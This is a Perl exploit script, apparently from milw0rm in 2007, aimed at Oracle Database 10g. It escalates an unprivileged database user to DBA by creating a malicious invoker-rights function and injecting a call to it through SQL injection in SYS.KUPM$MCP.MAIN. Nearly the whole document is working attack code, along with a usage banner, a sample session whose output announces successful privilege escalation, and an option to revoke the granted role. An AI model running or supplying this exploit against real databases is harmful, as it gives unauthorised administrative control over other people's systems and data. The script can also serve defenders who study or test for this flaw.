#!/usr/bin/perl
#
# Remote Oracle KUPM$MCP.MAIN exploit (10g)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"
# 
#   REF:    http://www.red-database-security.com/
#   
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Tue Mar 27 10:47:14 CEST 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
# 
# bunker@fin:~$ perl kupm-mcpmain.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  DBD::Oracle::db do failed: ORA-01951: ROLE 'DBA' not granted to 'BUNKER' (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM BUNKER"] at kupm-mcpmain.pl line 97.
#  [-] Done!
# 
# bunker@fin:~$ perl kupm-mcpmain.pl -h localhost -s test -u bunker -p **** -g
#  [-] Wait...
#  [-] Creating evil function...
#  [-] Go ...(don't worry about errors)!
#  DBD::Oracle::st execute failed: ORA-06512: at "SYS.KUPM$MCP", line 874
#  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "
#  BEGIN
#   SYS.KUPM$MCP.MAIN(''' AND 0=BUNKER.own--','');
#  END;"] at kupm-mcpmain.pl line 119.
#  [-] YOU GOT THE POWAH!!
# 
# bunker@fin:~$ perl kupm-mcpmain.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  [-] Done! 
#

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT ALL PRIVILEGE, DBA TO $user";
print "[-] Wait...\n";

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil function...\n";
$dbh->do( qq{
CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE '$sqlcmd'; COMMIT; 
 RETURN(0);
END;
} );
 
print "[-] Go ...(don't worry about errors)!\n";
my $sth = $dbh->prepare( qq{
BEGIN
 SYS.KUPM\$MCP.MAIN(''' AND 0=$user.own--','');
END;});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;

# milw0rm.com [2007-03-27]
